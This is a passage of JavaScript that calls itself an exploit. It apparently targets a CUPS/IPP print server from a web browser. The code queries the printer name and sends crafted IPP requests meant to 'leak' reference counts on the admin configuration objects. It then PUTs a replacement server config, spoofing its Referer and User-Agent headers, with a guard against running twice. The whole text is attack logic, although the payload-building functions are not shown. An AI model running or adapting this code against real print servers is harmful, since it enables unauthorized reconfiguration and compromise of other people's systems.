    do_alert("Expected response code " + expected_response_code + ", but got " + req.status);
  }
  return req.response;
}

function xhr_put_send(uri, body, expected_response_code) {
  var req = getHTTPObject();
  req.open("PUT", uri, false);
  req.setRequestHeader("Content-Type", "application/ipp");
  req.setRequestHeader("User-Agent", Config.UserAgent());
  req.setRequestHeader("Referer", Config.Referer());
  req.sendAsBinary(body);
  if (req.status != expected_response_code) {
    do_alert("Expected response code " + expected_response_code + ", but got " + req.status);
  }
  return req.response;
}

function parse_printer_name(body) {
  var ipp_parser = get_new_ipp_parser();
  ipp_parser.Initialize(body);
  if (!ipp_parser.ParseResponse()) {
    do_alert("Error parsing IPP response.");
    return "";
  }
  if (!ipp_parser.HaveAttribute("printer-name")) {
    do_alert("IPP response does not contain printer name.");
    return "";
  }
  var printer_name_attribute = ipp_parser.GetAttribute("printer-name");
  do_alert("Got printer name " + printer_name_attribute.GetValue() + " from IPP response.");
  return printer_name_attribute.GetValue();
}

function get_printer_name() {
  do_alert("Getting printer name...");
  var body = printer_name_body();
  var body_response = xhr_post_send(Config.HttpUriGetPrinters(), body, 200);
  do_alert("Body is: " + body_response);
  return parse_printer_name(body_response);
}

function leak_admin() {
  var body = leak_admin_body();
  xhr_post_send(Config.HttpUriPrinter(), body, 200);
}

function leak_admin_conf() {
  var body = leak_admin_conf_body();
  xhr_post_send(Config.HttpUriPrinter(), body, 200);
}

function replace_config() {
  var body = get_config_body();
  xhr_put_send(Config.HttpConfigUri(), body, 201);
}

do_alert("Starting exploit.");
do_alert("window.exploit_running = " + window.exploit_running);

if (!window.exploit_running) {
  window.exploit_running = true;
  do_alert("Not already exploited, trying...");

  if (!already_exploited()) {
    var printer_name = get_printer_name();
    do_alert("Printer name is: " + printer_name);
    Config.SetPrinterName(printer_name);
    do_alert("Leaking admin conf refcount.");
    leak_admin_conf();
    do_alert("Leaking admin refcount.");
    leak_admin();
    do_alert("Replacing config.");
    replace_config();
    do_alert("Done!");
  } else {
    do_alert("Already exploited!");
  }
} else {
  do_alert("Exploit already running.");
}
